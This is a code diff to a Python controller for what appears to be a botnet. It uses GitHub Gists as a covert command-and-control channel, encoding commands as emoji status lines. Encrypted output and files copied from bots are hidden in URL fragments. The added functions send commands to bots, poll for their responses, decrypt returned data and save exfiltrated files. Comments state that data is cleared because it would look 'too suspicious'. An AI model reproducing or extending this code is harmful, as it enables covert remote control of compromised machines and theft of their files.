@@ -1,9 +1,12 @@
 import os
 import sys
-from random import random
+import time
+import random
 
 import requests
 import gistyc
+import crypto
+import ntpath
 
 from Controller import emojis
 
@@ -92,23 +95,123 @@ def update_gist(gist_api, filename, content):
     os.remove('tmp/' + filename)
 
 
-def reset_status(content):
+def send_command(gist_api, cmd, filename, data=None, debug=True):
     """
-    Change the status (level of cuteness) in specified post to reset emoji.
+    1. Check if filename exists on GIST
+    2. Change status (Cuteness level) to reset
+    3. Change command (Fluffiness level) according to cmd param
+    4. Encode data to url link
 
-    :param content:        Content of the gistpost
-    :return: updated:      Updated content
+    :param fernet_key:
+    :param gist_api:        Gist api grom get_gist_api() function
+    :param filename:        Filename f the bot post (Identification of bot)
+    :param cmd:             Command to send
+    :param data:            Parameters of the command
+    :param debug:           Bool for debug messages
+    :return:
     """
+    content = get_raw(gist_api, filename)
+    if content is None:
+        if debug: print("\nERR: EXIT {} COMMAND ({} does not exists)".format(cmd, filename), file=sys.stderr)
+        return False
+
+    # if debug: print("{} {} EXECUTING".format(cmd, filename), file=sys.stderr)
+
+    # ----- Update status and command -----
     content_split = content.split('\n')
-    content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['reset'])
-    return "\n".join(content_split)
+    # Change status to reset (only if not reset already)
+    if content_split[1].split("cuteness")[-1].strip() not in emojis.status_code['reset']:
+        content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['reset'])
+    # Send ping command
+    content_split[2] = "### Level of fluffiness " + emojis.command[cmd]
+
+    # ----- Update data in url (encrypted) -----
+    if data is not None:
+        # Encrypt data to last url in port
+        new_last_url = content_split[-1].split("#")[0].rstrip(')') + \
+                       "#" + crypto.encrypt(data) + ")"
+        content_split[-1] = new_last_url
+
+    update_gist(gist_api, filename, "\n".join(content_split))
+    if debug: print("{} {} COMMAND SEND".format(cmd, filename), file=sys.stderr)
+    return True
 
 
-def init_folders():
-    # Create tmp dir if not exists
-    if not os.path.exists('tmp'):
-        os.mkdir('tmp')
+def check_response(gist_api, filename, time_to_wait=10):
+    """
+    In while loop check status of bot for 'time_to_wait' second.
+    Return True if status is success.
+
+    :param gist_api:        Gist api grom get_gist_api() function
+    :param filename:        Filename f the bot post (Identification of bot)
+    :param time_to_wait:
+    :return: Bool if bot responded
+    """
+    print("WAITING FOR RESPONSE", file=sys.stderr, end="")
+    while time_to_wait > 0:
+        print(".", file=sys.stderr, end="")
+        content = get_raw(gist_api, filename)
+        status = content.split('\n')[1].split("cuteness")[-1].strip()
+        if status in emojis.status_code['success']:
+            print(file=sys.stderr)
+            return True
+        elif status in emojis.status_code['error']:
+            print("\nERR: Command execution failed", file=sys.stderr)
+            return True     # As we still want to display output
+
+        print(".", file=sys.stderr, end="")
+        time.sleep(1)
+        time_to_wait -= 1
+
+    print("\nERR: Bot did not respond", file=sys.stderr)  # Do nothing as bot will be removed when pong
+    return False
 
 
-def clean_up_folders():
-    os.rmdir('tmp')
+def print_response(gist_api, filename):
+    """
+    Read last url from content and decrypt data. Print to stdout.
+
+    :param gist_api:        Gist api grom get_gist_api() function
+    :param filename:        Filename f the bot post (Identification of bot)
+    :return: None
+    """
+    content = get_raw(gist_api, filename)
+    content_split = content.split("\n")
+    data = content_split[-1].split("#")[1]
+    data = crypto.decrypt(data)
+    data = data.split('\n')
+
+    for line in data:
+        print(line)
+
+    # Remove data from url (If too long -> Gist show entire url in post on main page = Too Suspicious)
+    new_last_url = content_split[-1].split("#")[0] + ")"
+    content_split[-1] = new_last_url
+    update_gist(gist_api, filename, "\n".join(content_split))
+
+
+def save_file_response(gist_api, filename, file):
+    """
+    Save binary file from the bot post last url into defined file.
+    The files are copied to the 'copied' directory in Controller.
+
+    :param gist_api:        Gist api grom get_gist_api() function
+    :param filename:        Filename f the bot post (Identification of bot)
+    :param file:            Name of the file to be saved
+    :return:
+    """
+    content = get_raw(gist_api, filename)
+    content_split = content.split("\n")
+    data_array = content_split[-1].split("#")
+    if len(data_array) > 1:
+        data = crypto.decrypt_in_bytes(data_array[1].rstrip(')'))
+        with open('copied/' + ntpath.basename(file), "wb") as binary_file:
+            binary_file.write(data)
+
+    # Remove data from url (If too long -> Gist show entire url in post on main page = Too Suspicious)
+    new_last_url = content_split[-1].split("#")[0] + ")"
+    content_split[-1] = new_last_url
+    update_gist(gist_api, filename, "\n".join(content_split))
+
+
+
